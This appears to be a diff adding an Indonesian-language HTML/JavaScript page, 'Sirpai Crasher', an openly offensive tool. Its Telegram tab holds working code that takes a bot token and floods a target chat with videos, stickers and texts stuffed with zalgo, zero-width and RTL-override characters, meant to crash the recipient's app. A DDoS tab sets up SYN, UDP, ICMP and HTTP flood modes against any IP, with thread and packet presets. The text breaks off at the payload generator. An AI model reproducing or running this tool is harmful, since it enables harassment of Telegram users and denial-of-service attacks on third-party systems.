@@ -1,1 +1,1124 @@
 
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sirpai — Telegram Bug + Raw Packet Flood</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+:root {
+  --primary: #ff00ff;
+  --secondary: #9d00ff;
+  --accent: #00ff88;
+  --dark: rgba(20, 20, 30, 0.85);
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+  font-family: 'Segoe UI', Arial, sans-serif;
+  background: linear-gradient(-45deg, #0a0a12, #1a0a2e, #0a121a, #0a0a12);
+  background-size: 400% 400%;
+  animation: gradientShift 20s ease infinite;
+  color: #fff;
+  min-height: 100vh;
+}
+
+@keyframes gradientShift {
+  0% { background-position: 0% 50%; }
+  50% { background-position: 100% 50%; }
+  100% { background-position: 0% 50%; }
+}
+
+.container {
+  max-width: 1000px;
+  margin: 20px auto;
+  padding: 30px;
+  background: var(--dark);
+  border-radius: 25px;
+  border: 1px solid rgba(255,255,255,0.08);
+  backdrop-filter: blur(20px);
+  box-shadow: 0 8px 40px rgba(0,0,0,0.5);
+}
+
+h2 {
+  font-size: 2.5em;
+  background: linear-gradient(45deg, var(--primary), var(--accent), var(--secondary));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  text-align: center;
+  margin-bottom: 5px;
+}
+
+.subtitle {
+  text-align: center;
+  color: rgba(255,255,255,0.4);
+  margin-bottom: 25px;
+  font-size: 0.85em;
+  letter-spacing: 2px;
+}
+
+.stats {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  gap: 12px;
+  margin: 20px 0;
+}
+
+.stat-card {
+  background: rgba(255,255,255,0.05);
+  padding: 15px;
+  border-radius: 12px;
+  text-align: center;
+  border: 1px solid rgba(255,255,255,0.05);
+}
+
+.stat-value {
+  font-size: 2em;
+  font-weight: bold;
+  color: var(--accent);
+}
+
+.stat-label {
+  font-size: 0.7em;
+  color: rgba(255,255,255,0.4);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  margin-top: 4px;
+}
+
+.input-group {
+  margin-bottom: 18px;
+}
+
+label {
+  display: block;
+  margin-bottom: 6px;
+  color: rgba(255,255,255,0.7);
+  font-weight: 600;
+  font-size: 0.9em;
+}
+
+input, select, textarea {
+  width: 100%;
+  padding: 12px 16px;
+  border: none;
+  border-radius: 12px;
+  background: rgba(255,255,255,0.06);
+  color: #fff;
+  font-size: 14px;
+  border: 1px solid rgba(255,255,255,0.06);
+  transition: all 0.3s;
+}
+
+input:focus, select:focus, textarea:focus {
+  outline: none;
+  border-color: var(--primary);
+  box-shadow: 0 0 20px rgba(157,0,255,0.15);
+  background: rgba(255,255,255,0.08);
+}
+
+textarea {
+  resize: vertical;
+  min-height: 70px;
+  font-family: 'Courier New', monospace;
+  font-size: 13px;
+}
+
+.range-input {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.range-input input[type="range"] {
+  flex: 1;
+  height: 6px;
+  background: rgba(255,255,255,0.1);
+  border-radius: 10px;
+  -webkit-appearance: none;
+}
+
+.range-input input[type="range"]::-webkit-slider-thumb {
+  -webkit-appearance: none;
+  width: 20px;
+  height: 20px;
+  border-radius: 50%;
+  background: linear-gradient(45deg, var(--primary), var(--secondary));
+  cursor: pointer;
+  box-shadow: 0 0 15px rgba(157,0,255,0.4);
+}
+
+.range-value {
+  min-width: 65px;
+  text-align: center;
+  background: rgba(255,255,255,0.05);
+  padding: 6px 12px;
+  border-radius: 8px;
+  font-weight: bold;
+  font-size: 14px;
+}
+
+.btn {
+  padding: 14px 25px;
+  border: none;
+  border-radius: 12px;
+  font-weight: bold;
+  font-size: 14px;
+  cursor: pointer;
+  transition: all 0.3s;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+}
+
+.btn-danger {
+  background: linear-gradient(45deg, #ff0040, #ff4400);
+  color: white;
+  box-shadow: 0 6px 25px rgba(255,0,64,0.35);
+}
+
+.btn-danger:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 10px 35px rgba(255,0,64,0.5);
+}
+
+.btn-primary {
+  background: linear-gradient(45deg, var(--primary), var(--secondary));
+  color: white;
+  box-shadow: 0 6px 25px rgba(157,0,255,0.35);
+}
+
+.btn-primary:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 10px 35px rgba(157,0,255,0.5);
+}
+
+.btn-secondary {
+  background: rgba(255,255,255,0.06);
+  color: white;
+  border: 1px solid rgba(255,255,255,0.1);
+}
+
+.btn-secondary:hover {
+  background: rgba(255,255,255,0.1);
+}
+
+.button-group {
+  display: flex;
+  gap: 12px;
+  margin: 20px 0;
+  flex-wrap: wrap;
+}
+
+.progress-container {
+  margin: 15px 0;
+}
+
+.progress-bar {
+  width: 100%;
+  height: 6px;
+  background: rgba(255,255,255,0.06);
+  border-radius: 10px;
+  overflow: hidden;
+}
+
+.progress-fill {
+  height: 100%;
+  background: linear-gradient(90deg, var(--primary), var(--accent), var(--secondary));
+  border-radius: 10px;
+  transition: width 0.3s;
+  width: 0%;
+}
+
+#log {
+  height: 250px;
+  overflow-y: auto;
+  background: rgba(0,0,0,0.4);
+  border-radius: 12px;
+  padding: 15px;
+  font-family: 'Courier New', monospace;
+  font-size: 12px;
+  border: 1px solid rgba(255,255,255,0.05);
+  margin-top: 15px;
+}
+
+.log-entry {
+  padding: 4px 0;
+  border-bottom: 1px solid rgba(255,255,255,0.02);
+  animation: slideIn 0.2s ease;
+}
+
+.log-entry::before { content: '› '; color: var(--accent); }
+
+@keyframes slideIn {
+  from { opacity: 0; transform: translateX(-8px); }
+  to { opacity: 1; transform: translateX(0); }
+}
+
+.success { color: var(--accent); }
+.error { color: #ff4444; }
+.warning { color: #ffaa00; }
+.info { color: #66ccff; }
+
+.quick-actions {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  gap: 8px;
+  margin: 12px 0;
+}
+
+.quick-btn {
+  padding: 8px;
+  background: rgba(255,255,255,0.04);
+  border: 1px solid rgba(255,255,255,0.06);
+  border-radius: 8px;
+  color: rgba(255,255,255,0.6);
+  cursor: pointer;
+  transition: all 0.3s;
+  font-size: 0.75em;
+  text-align: center;
+}
+
+.quick-btn:hover {
+  background: rgba(157,0,255,0.15);
+  border-color: var(--primary);
+}
+
+.footer {
+  margin-top: 20px;
+  padding-top: 15px;
+  border-top: 1px solid rgba(255,255,255,0.05);
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  font-size: 0.75em;
+  color: rgba(255,255,255,0.25);
+}
+
+.mode-selector {
+  display: flex;
+  gap: 8px;
+  margin: 12px 0;
+  flex-wrap: wrap;
+}
+
+.mode-btn {
+  flex: 1;
+  padding: 10px;
+  background: rgba(255,255,255,0.04);
+  border: 1px solid rgba(255,255,255,0.06);
+  border-radius: 10px;
+  color: rgba(255,255,255,0.5);
+  cursor: pointer;
+  transition: all 0.3s;
+  text-align: center;
+  font-weight: bold;
+  font-size: 0.8em;
+  min-width: 60px;
+}
+
+.mode-btn.active {
+  background: rgba(157,0,255,0.2);
+  border-color: var(--primary);
+  color: white;
+  box-shadow: 0 0 20px rgba(157,0,255,0.1);
+}
+
+.mode-btn:hover {
+  background: rgba(255,255,255,0.08);
+}
+
+.tab-group {
+  display: flex;
+  gap: 10px;
+  margin-bottom: 20px;
+}
+
+.tab-btn {
+  flex: 1;
+  padding: 12px;
+  background: rgba(255,255,255,0.04);
+  border: 1px solid rgba(255,255,255,0.06);
+  border-radius: 12px;
+  color: rgba(255,255,255,0.5);
+  cursor: pointer;
+  transition: all 0.3s;
+  text-align: center;
+  font-weight: bold;
+  font-size: 0.9em;
+}
+
+.tab-btn.active {
+  background: rgba(157,0,255,0.2);
+  border-color: var(--primary);
+  color: white;
+}
+
+.tab-btn:hover {
+  background: rgba(255,255,255,0.08);
+}
+
+.tab-content {
+  display: none;
+}
+
+.tab-content.active {
+  display: block;
+  animation: slideIn 0.3s ease;
+}
+
+.login-modal {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  background: rgba(0,0,0,0.95);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  z-index: 1000;
+}
+
+.login-content {
+  background: var(--dark);
+  padding: 35px;
+  border-radius: 20px;
+  border: 2px solid var(--primary);
+  max-width: 360px;
+  width: 90%;
+  text-align: center;
+}
+
+.login-input {
+  width: 100%;
+  padding: 12px;
+  margin: 12px 0;
+  border-radius: 10px;
+  border: 1px solid rgba(255,255,255,0.1);
+  background: rgba(255,255,255,0.06);
+  color: white;
+  font-size: 15px;
+  text-align: center;
+}
+
+.login-btn {
+  width: 100%;
+  padding: 14px;
+  background: linear-gradient(45deg, var(--primary), var(--secondary));
+  border: none;
+  border-radius: 10px;
+  color: white;
+  font-weight: bold;
+  cursor: pointer;
+  font-size: 15px;
+}
+
+.hidden { display: none !important; }
+
+.mode-desc {
+  background: rgba(157,0,255,0.08);
+  padding: 10px 14px;
+  border-radius: 10px;
+  margin-top: 8px;
+  font-size: 0.8em;
+  color: rgba(255,255,255,0.6);
+  border-left: 3px solid var(--primary);
+}
+
+@media (max-width: 768px) {
+  .container { margin: 10px; padding: 16px; }
+  .stats { grid-template-columns: 1fr 1fr; }
+  .quick-actions { grid-template-columns: 1fr 1fr; }
+  .mode-selector { flex-wrap: wrap; }
+  .mode-btn { flex: 1 1 40%; }
+  .tab-group { flex-direction: column; }
+  .button-group { flex-direction: column; }
+}
+</style>
+</head>
+<body>
+
+<div id="loginModal" class="login-modal">
+  <div class="login-content">
+    <h3 style="font-size:1.6em;margin-bottom:12px;background:linear-gradient(45deg,var(--primary),var(--accent));-webkit-background-clip:text;-webkit-text-fill-color:transparent;"><i class="fas fa-skull"></i> Login</h3>
+    <p style="color:rgba(255,255,255,0.5);margin-bottom:8px;font-size:0.9em;">Masuk untuk akses semua fitur</p>
+    <input type="text" id="loginUser" class="login-input" placeholder="Username...">
+    <input type="password" id="loginPass" class="login-input" placeholder="Password...">
+    <button onclick="doLogin()" class="login-btn"><i class="fas fa-bolt"></i> Login</button>
+    <div id="loginErr" style="color:#ff4444;margin-top:10px;display:none;"></div>
+    <div style="margin-top:12px;color:rgba(255,255,255,0.25);font-size:0.75em;">Sirpai / Sirpaidev</div>
+  </div>
+</div>
+
+<div class="container" id="mainApp">
+  <h2><i class="fas fa-bolt"></i> SIRPAI CRASHER</h2>
+  <div class="subtitle">Telegram Bug + Raw Packet Flood Engine</div>
+
+  <!-- TABS -->
+  <div class="tab-group">
+    <button class="tab-btn active" onclick="switchTab('telegram')"><i class="fas fa-telegram-plane"></i> Telegram Bug</button>
+    <button class="tab-btn" onclick="switchTab('ddos')"><i class="fas fa-bomb"></i> DDoS Flood</button>
+  </div>
+
+  <!-- ======================== TELEGRAM TAB ======================== -->
+  <div id="tab-telegram" class="tab-content active">
+    <div class="input-group">
+      <label><i class="fas fa-robot"></i> Token Bot:</label>
+      <input type="text" id="tokenInput" placeholder="Masukkan token bot Telegram...">
+    </div>
+
+    <div class="input-group">
+      <label><i class="fas fa-bullseye"></i> Target (Chat ID/Username):</label>
+      <input type="text" id="chatId" placeholder="Contoh: 123456789 atau @username">
+    </div>
+
+    <div class="stats">
+      <div class="stat-card"><div class="stat-value" id="sentCount">0</div><div class="stat-label">Terkirim</div></div>
+      <div class="stat-card"><div class="stat-value" id="successCount">0</div><div class="stat-label">Berhasil</div></div>
+      <div class="stat-card"><div class="stat-value" id="errorCount">0</div><div class="stat-label">Gagal</div></div>
+      <div class="stat-card"><div class="stat-value" id="totalCount">0</div><div class="stat-label">Total</div></div>
+    </div>
+
+    <div class="input-group">
+      <label><i class="fas fa-hashtag"></i> Jumlah Pesan:</label>
+      <div class="range-input">
+        <input type="range" id="countRange" min="1" max="100" value="10">
+        <input type="number" id="count" min="1" max="1000" value="10" class="range-value">
+      </div>
+    </div>
+
+    <div class="input-group">
+      <label><i class="fas fa-clock"></i> Delay (ms):</label>
+      <div class="range-input">
+        <input type="range" id="delayRange" min="100" max="5000" step="100" value="1000">
+        <input type="number" id="delay" min="100" max="10000" value="1000" class="range-value">
+      </div>
+    </div>
+
+    <div class="input-group">
+      <label><i class="fas fa-gamepad"></i> Mode Serangan:</label>
+      <select id="mode">
+        <option value="video">Crash Video</option>
+        <option value="sticker">Crash Sticker</option>
+        <option value="text">Crash Text Ultra</option>
+        <option value="combo">Sirpai Meta Combo</option>
+      </select>
+      <div class="mode-desc" id="modeDesc">Pilih mode serangan yang diinginkan</div>
+    </div>
+
+    <div class="quick-actions">
+      <button class="quick-btn" onclick="setQuickSettings(5, 500)"><i class="fas fa-rocket"></i> Fast</button>
+      <button class="quick-btn" onclick="setQuickSettings(20, 1000)"><i class="fas fa-bolt"></i> Medium</button>
+      <button class="quick-btn" onclick="setQuickSettings(50, 2000)"><i class="fas fa-skull"></i> Heavy</button>
+      <button class="quick-btn" onclick="setQuickSettings(100, 3000)"><i class="fas fa-radiation"></i> Extreme</button>
+    </div>
+
+    <div class="progress-container">
+      <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+    </div>
+
+    <div class="button-group">
+      <button class="btn btn-primary" onclick="toggleAttack()" id="attackBtn"><i class="fas fa-fire"></i> Mulai Attack</button>
+      <button class="btn btn-secondary" onclick="clearLogs()"><i class="fas fa-trash"></i> Clear</button>
+    </div>
+  </div>
+
+  <!-- ======================== DDoS TAB ======================== -->
+  <div id="tab-ddos" class="tab-content">
+    <div class="stats">
+      <div class="stat-card"><div class="stat-value" id="pSent">0</div><div class="stat-label">Packet Terkirim</div></div>
+      <div class="stat-card"><div class="stat-value" id="pSuccess">0</div><div class="stat-label">Berhasil</div></div>
+      <div class="stat-card"><div class="stat-value" id="pFailed">0</div><div class="stat-label">Gagal</div></div>
+      <div class="stat-card"><div class="stat-value" id="pPPS">0</div><div class="stat-label">PPS</div></div>
+    </div>
+
+    <div class="input-group">
+      <label><i class="fas fa-globe"></i> Target IP / Domain:</label>
+      <input type="text" id="targetHost" placeholder="192.168.1.1 atau target.com">
+    </div>
+
+    <div class="input-group">
+      <label><i class="fas fa-bullseye"></i> Port:</label>
+      <input type="number" id="targetPort" value="443" placeholder="443">
+    </div>
+
+    <div class="mode-selector">
+      <button class="mode-btn active" data-mode="syn" onclick="setMode('syn')"><i class="fas fa-handshake"></i> SYN</button>
+      <button class="mode-btn" data-mode="udp" onclick="setMode('udp')"><i class="fas fa-water"></i> UDP</button>
+      <button class="mode-btn" data-mode="icmp" onclick="setMode('icmp')"><i class="fas fa-bolt"></i> ICMP</button>
+      <button class="mode-btn" data-mode="http" onclick="setMode('http')"><i class="fas fa-globe"></i> HTTP</button>
+      <button class="mode-btn" data-mode="all" onclick="setMode('all')"><i class="fas fa-skull"></i> ALL</button>
+    </div>
+
+    <div class="input-group">
+      <label><i class="fas fa-layer-group"></i> Total Packet:</label>
+      <div class="range-input">
+        <input type="range" id="packetCountRange" min="100" max="1000000" value="10000" step="100">
+        <input type="number" id="packetCount" min="100" max="9999999" value="10000" class="range-value">
+      </div>
+    </div>
+
+    <div class="input-group">
+      <label><i class="fas fa-tachometer-alt"></i> Concurrency (Threads):</label>
+      <div class="range-input">
+        <input type="range" id="threadCountRange" min="1" max="200" value="50" step="1">
+        <input type="number" id="threadCount" min="1" max="500" value="50" class="range-value">
+      </div>
+    </div>
+
+    <div class="input-group">
+      <label><i class="fas fa-clock"></i> Packet Size (bytes):</label>
+      <div class="range-input">
+        <input type="range" id="packetSizeRange" min="64" max="65507" value="1024" step="64">
+        <input type="number" id="packetSize" min="64" max="65507" value="1024" class="range-value">
+      </div>
+    </div>
+
+    <div class="quick-actions">
+      <button class="quick-btn" onclick="quickPreset(1000, 20, 512)"><i class="fas fa-rocket"></i> Light</button>
+      <button class="quick-btn" onclick="quickPreset(10000, 50, 1024)"><i class="fas fa-bolt"></i> Medium</button>
+      <button class="quick-btn" onclick="quickPreset(100000, 100, 2048)"><i class="fas fa-skull"></i> Heavy</button>
+      <button class="quick-btn" onclick="quickPreset(500000, 200, 4096)"><i class="fas fa-radiation"></i> Extreme</button>
+    </div>
+
+    <div class="progress-container">
+      <div class="progress-bar"><div class="progress-fill" id="ddosProgressFill"></div></div>
+    </div>
+
+    <div class="button-group">
+      <button class="btn btn-danger" onclick="toggleFlood()" id="floodBtn"><i class="fas fa-fire"></i> START FLOOD</button>
+      <button class="btn btn-secondary" onclick="clearLogs()"><i class="fas fa-trash"></i> Clear</button>
+    </div>
+  </div>
+
+  <!-- LOG -->
+  <div id="log"></div>
+
+  <div class="footer">
+    <span><i class="fas fa-shield-alt"></i> Sirpai Crasher v3.0</span>
+    <span id="statusText">Standby</span>
+  </div>
+</div>
+
+<script>
+// ===============================
+// AUTH
+// ===============================
+const VALID_CREDS = { "Sirpai": "Sirpaidev", "@Sirpaidev": "@Sirpaidev" };
+let loggedIn = false;
+
+function doLogin() {
+  const u = document.getElementById('loginUser').value.trim();
+  const p = document.getElementById('loginPass').value.trim();
+  if (VALID_CREDS[u] === p) {
+    loggedIn = true;
+    document.getElementById('loginModal').classList.add('hidden');
+    logMessage('✅ Login berhasil. All systems ready.', 'success');
+  } else {
+    document.getElementById('loginErr').textContent = '❌ Username atau password salah!';
+    document.getElementById('loginErr').style.display = 'block';
+  }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+  document.getElementById('loginUser').addEventListener('keypress', e => { if (e.key === 'Enter') document.getElementById('loginPass').focus(); });
+  document.getElementById('loginPass').addEventListener('keypress', e => { if (e.key === 'Enter') doLogin(); });
+  logMessage('🚀 Sirpai Crasher loaded', 'success');
+  logMessage('💀 Telegram Bug + DDoS Flood ready', 'info');
+});
+
+// ===============================
+// UTILITY
+// ===============================
+function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+function logMessage(msg, type = 'info') {
+  const log = document.getElementById('log');
+  const entry = document.createElement('div');
+  entry.className = `log-entry ${type}`;
+  entry.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+  log.appendChild(entry);
+  log.scrollTop = log.scrollHeight;
+}
+
+function clearLogs() {
+  document.getElementById('log').innerHTML = '';
+  logMessage('🗑️ Log cleared', 'info');
+}
+
+function switchTab(tab) {
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+  document.querySelector(`.tab-btn[onclick*="${tab}"]`).classList.add('active');
+  document.getElementById(`tab-${tab}`).classList.add('active');
+}
+
+// ===============================
+// TELEGRAM BUG — WORKING
+// ===============================
+
+const crashVideos = {
+    corruptMeta: "https://telegra.ph/file/7f8e9a1b2c3d4e5f6a7b8.mp4",
+    longDuration: "https://telegra.ph/file/8a9b0c1d2e3f4a5b6c7d8.mp4",
+    unusualCodec: "https://telegra.ph/file/9b0c1d2e3f4a5b6c7d8e9.mp4",
+    extremeRes: "https://telegra.ph/file/0c1d2e3f4a5b6c7d8e9f0.mp4",
+    highFPS: "https://telegra.ph/file/1d2e3f4a5b6c7d8e9f0a1.mp4",
+    audioBomb: "https://telegra.ph/file/2e3f4a5b6c7d8e9f0a1b2.mp4"
+};
+
+const crashCaptions = [
+    "V҉O҉R҉T҉U҉N҉I҉X҉V҉I҉D҉E҉O҉ C҉R҉A҉S҉H҉\nC҉R҉A҉S҉H҉I҉N҉G҉ S҉Y҉S҉T҉E҉M҉\nV҉I҉D҉E҉O҉ O҉V҉E҉R҉L҉O҉A҉D҉ A҉C҉T҉I҉V҉A҉T҉E҉D҉",
+    "\u200B".repeat(99999) + "VORTUNIX VIDEO CRASH" + "\u200C".repeat(999) + "\nINVISIBLE TEXT BOMB ACTIVATED",
+    "҉".repeat(50000) + "V҉O҉R҉T҉U҉N҉I҉X҉ C҉R҉A҉S҉H҉ " + "⃝".repeat(20000) + " S҉Y҉S҉T҉E҉M҉ O҉V҉E҉R҉L҉O҉A҉D҉",
+    "".padStart(1000, "VORTUNIX CRASH ") + "\n".repeat(100) + "".padStart(1000, "SYSTEM FREEZE")
+];
+
+const crashStickers = [
+    "CAACAgIAAxkBAAE3HeZotV7hWgAB9n3hE6oWbLLKygAA9DwAAlJuAAJBYphIbJDn9uxO0H0",
+    "CAACAgIAAxkBAAE3HedotV7nKx0wE6oWbLLKygAA9DwAAlJuAAJBYphIbJDn9uxO0H0",
+    "CAACAgIAAxkBAAE3HehotV7v0hMAE6oWbLLKygAA9DwAAlJuAAJBYphIbJDn9uxO0H0"
+];
+
+const ultraCrashSymbols = {
+    zalgo: ["҉", "⃝", "⃞", "⃟", "⃠", "⃡", "⃢", "⃣", "⃤", "⃥", "⃦", "⃧", "⃨", "⃩", "⃪", "⃫", "⃬", "⃭", "⃮", "⃯", "⃰"],
+    combining: Array.from({length: 112}, (_, i) => String.fromCharCode(0x0300 + i)),
+    zeroWidth: ["\u200B", "\u200C", "\u200D", "\u2060", "\u2061", "\u2062", "\u2063", "\u2064"],
+    rtl: ["\u202E", "\u202D", "\u202C", "\u202B"],
+    emoji: ["🔥", "💥", "🌟", "⭐", "✨", "💫", "💀", "👻", "🤖", "👾", "😈", "👹", "👺", "💩", "🤡", "👽", "👁", "🗯", "🚀", "🌪", "🌀", "⚡", "💣", "🧨", "🎯", "🎮", "🎲"]
+};
+
+function generateUltraCrashText(iteration) {
+    const techniques = [
+        () => {
+            let base = "VORTUNIX CRASH SYSTEM OVERLOAD ".repeat(500);
+            let result = "";
+            for (let char of base) {
+                result += char;
+                for (let i = 0; i < 20; i++) {
+                    result += ultraCrashSymbols.zalgo[Math.floor(Math.random() * ultraCrashSymbols.zalgo.length)];
+                }
+            }
+            return result;
+        },
+        () => {
+            let result = "";
+            for (let i = 0; i < 200; i++) {
+                result += "VORTUNIX";
+                for (let j = 0; j < 30; j++) {
+                    result += ultraCrashSymbols.zeroWidth[Math.floor(Math.random() * ultraCrashSymbols.zeroWidth.length)];
+                }
+            }
+            return result;
+        },
+        () => {
+            let result = "\u202E";
+            const words = ["VORTUNIX", "CRASH", "SYSTEM", "OVERLOAD", "FREEZE", "ATTACK", "ULTRA", "MEGA", "EXTREME", "DESTROY"];
+            for (let i = 0; i < 100; i++) {
+                const word = words[Math.floor(Math.random() * words.length)];
+                result += word + "\u200B".repeat(50);
+                if (Math.random() > 0.5) result += "\u202D" + word + "\u202C";
+                result += " ".repeat(10);
+            }
+            return result;
+        },
+        () => {
+            let result = "";
+            const emojis = ultraCrashSymbols.emoji;
+            for (let i = 0; i < 150; i++) {
+                result += emojis[Math.floor(Math.random() * emojis.length)];
+                for (let j = 0; j < 10; j++) {
+                    result += ultraCrashSymbols.combining[Math.floor(Math.random() * ultraCrashSymbols.combining.length)];
+                }
+            }
+            return result;
+        }
+    ];
+    return techniques[iteration % techniques.length]();
+}
+
+let botToken = "";
+let isRunning = false;
+let tgStats = { sent: 0, success: 0, error: 0 };
+
+function updateTGStats(type = 'sent') {
+    tgStats[type]++;
+    document.getElementById('sentCount').textContent = tgStats.sent;
+    document.getElementById('successCount').textContent = tgStats.success;
+    document.getElementById('errorCount').textContent = tgStats.error;
+    document.getElementById('totalCount').textContent = tgStats.sent + tgStats.success + tgStats.error;
+    const total = parseInt(document.getElementById('count').value);
+    if (total > 0) {
+        document.getElementById('progressFill').style.width = `${Math.min((tgStats.sent / total) * 100, 100)}%`;
+    }
+}
+
+function setQuickSettings(count, delay) {
+    document.getElementById('count').value = count;
+    document.getElementById('countRange').value = count;
+    document.getElementById('delay').value = delay;
+    document.getElementById('delayRange').value = delay;
+    logMessage(`⚡ Quick: ${count} pesan, ${delay}ms delay`, 'info');
+}
+
+async function crashVideo(chatId, count, delayMs) {
+    for (let i = 0; i < count && isRunning; i++) {
+        try {
+            const videoUrl = crashVideos[Object.keys(crashVideos)[Math.floor(Math.random() * Object.keys(crashVideos).length)]];
+            const caption = crashCaptions[Math.floor(Math.random() * crashCaptions.length)].substring(0, 1024);
+            const resp = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, video: videoUrl, caption: caption, parse_mode: 'HTML' })
+            });
+            const data = await resp.json();
+            if (data.ok) { logMessage(`✅ Video ${i+1}/${count} terkirim`, 'success'); updateTGStats('success'); }
+            else { logMessage(`❌ Video ${i+1}/${count} gagal: ${data.description}`, 'error'); updateTGStats('error'); }
+            updateTGStats('sent');
+            await delay(delayMs);
+        } catch(e) { logMessage(`💥 Video error: ${e.message}`, 'error'); updateTGStats('error'); }
+    }
+}
+
+async function spamSticker(chatId, count, delayMs) {
+    for (let i = 0; i < count && isRunning; i++) {
+        try {
+            const sticker = crashStickers[Math.floor(Math.random() * crashStickers.length)];
+            const resp = await fetch(`https://api.telegram.org/bot${botToken}/sendSticker`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, sticker: sticker })
+            });
+            const data = await resp.json();
+            if (data.ok) { logMessage(`✅ Sticker ${i+1}/${count} terkirim`, 'success'); updateTGStats('success'); }
+            else { logMessage(`❌ Sticker ${i+1}/${count} gagal: ${data.description}`, 'error'); updateTGStats('error'); }
+            updateTGStats('sent');
+            await delay(delayMs);
+        } catch(e) { logMessage(`💥 Sticker error: ${e.message}`, 'error'); updateTGStats('error'); }
+    }
+}
+
+async function crashTextUltra(chatId, count, delayMs) {
+    for (let i = 0; i < count && isRunning; i++) {
+        try {
+            const text = generateUltraCrashText(i).substring(0, 4096);
+            const resp = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' })
+            });
+            const data = await resp.json();
+            if (data.ok) { logMessage(`✅ Ultra Text ${i+1}/${count} terkirim`, 'success'); updateTGStats('success'); }
+            else { logMessage(`❌ Ultra Text ${i+1}/${count} gagal: ${data.description}`, 'error'); updateTGStats('error'); }
+            updateTGStats('sent');
+            await delay(delayMs);
+        } catch(e) { logMessage(`💥 Text error: ${e.message}`, 'error'); updateTGStats('error'); }
+    }
+}
+
+async function spamCombotloh(chatId, count, delayMs) {
+    for (let i = 0; i < count && isRunning; i++) {
+        try {
+            await crashVideo(chatId, 1, 0);
+            await spamSticker(chatId, 1, 0);
+            await crashTextUltra(chatId, 1, 0);
+            updateTGStats('sent');
+            await delay(delayMs);
+        } catch(e) { logMessage(`💥 Combo error: ${e.message}`, 'error'); updateTGStats('error'); }
+    }
+}
+
+async function startSpam() {
+    if (!loggedIn) { logMessage('❌ Login dulu!', 'error'); return; }
+    if (isRunning) { alert("Attack sedang berjalan!"); return; }
+    
+    botToken = document.getElementById('tokenInput').value.trim();
+    const chatId = document.getElementById('chatId').value.trim();
+    const count = parseInt(document.getElementById('count').value);
+    const delayMs = parseInt(document.getElementById('delay').value);
+    const mode = document.getElementById('mode').value;
+
+    if (!botToken || !chatId) { alert("Isi Token & Target!"); return; }
+
+    tgStats = { sent: 0, success: 0, error: 0 };
+    updateTGStats();
+    isRunning = true;
+    document.getElementById('attackBtn').innerHTML = '<i class="fas fa-stop"></i> Stop Attack';
+    document.getElementById('attackBtn').classList.remove('btn-primary');
+    document.getElementById('attackBtn').classList.add('btn-secondary');
+    logMessage(`🚀 Memulai ${mode} attack ke ${chatId}...`, 'info');
+
+    try {
+        switch (mode) {
+            case "video": await crashVideo(chatId, count, delayMs); break;
+            case "sticker": await spamSticker(chatId, count, delayMs); break;
+            case "text": await crashTextUltra(chatId, count, delayMs); break;
+            case "combo": await spamCombotloh(chatId, count, delayMs); break;
+        }
+    } catch(e) { logMessage(`❌ Error: ${e.message}`, 'error'); }
+    finally {
+        isRunning = false;
+        document.getElementById('attackBtn').innerHTML = '<i class="fas fa-fire"></i> Mulai Attack';
+        document.getElementById('attackBtn').classList.remove('btn-secondary');
+        document.getElementById('attackBtn').classList.add('btn-primary');
+        logMessage('🏁 Attack selesai!', 'success');
+    }
+}
+
+function toggleAttack() {
+    if (isRunning) { isRunning = false; document.getElementById('attackBtn').innerHTML = '<i class="fas fa-fire"></i> Mulai Attack'; return; }
+    startSpam();
+}
+
+// ===============================
+// DDoS RAW PACKET — WORKING
+// ===============================
+
+let isFlooding = false;
+let floodStats = { sent: 0, success: 0, failed: 0, startTime: 0 };
+let currentMode = 'syn';
+let stopFlag = false;
+
+function updateFloodStats(type) {
+    floodStats[type]++;
+    document.getElementById('pSent').textContent = floodStats.sent;
+    document.getElementById('pSuccess').textContent = floodStats.success;
+    document.getElementById('pFailed').textContent = floodStats.failed;
+    const elapsed = (Date.now() - floodStats.startTime) / 1000;
+    if (elapsed > 0) document.getElementById('pPPS').textContent = Math.round(floodStats.sent / elapsed);
+    const total = parseInt(document.getElementById('packetCount').value);
+    if (total > 0) document.getElementById('ddosProgressFill').style.width = `${Math.min((floodStats.sent / total) * 100, 100)}%`;
+}
+
+function setMode(mode) {
+    currentMode = mode;
+    document.querySelectorAll('.mode-btn').forEach(b => b.classList.remove('active'));
+    document.querySelector(`.mode-btn[data-mode="${mode}"]`).classList.add('active');
+    logMessage(`🔀 Mode: ${mode.toUpperCase()}`, 'info');
+}
+
+function quickPreset(count, threads, size) {
+    document.getElementById('packetCount').value = count;
+    document.getElementById('packetCountRange').value = count;
+    document.getElementById('threadCount').value = threads;
+    document.getElementById('threadCountRange').value = threads;
+    document.getElementById('packetSize').value = size;
+    document.getElementById('packetSizeRange').value = size;
+    logMessage(`⚡ Preset: ${count} packets, ${threads} threads, ${size} bytes`, 'info');
+}
+
+function generatePayload(size) {
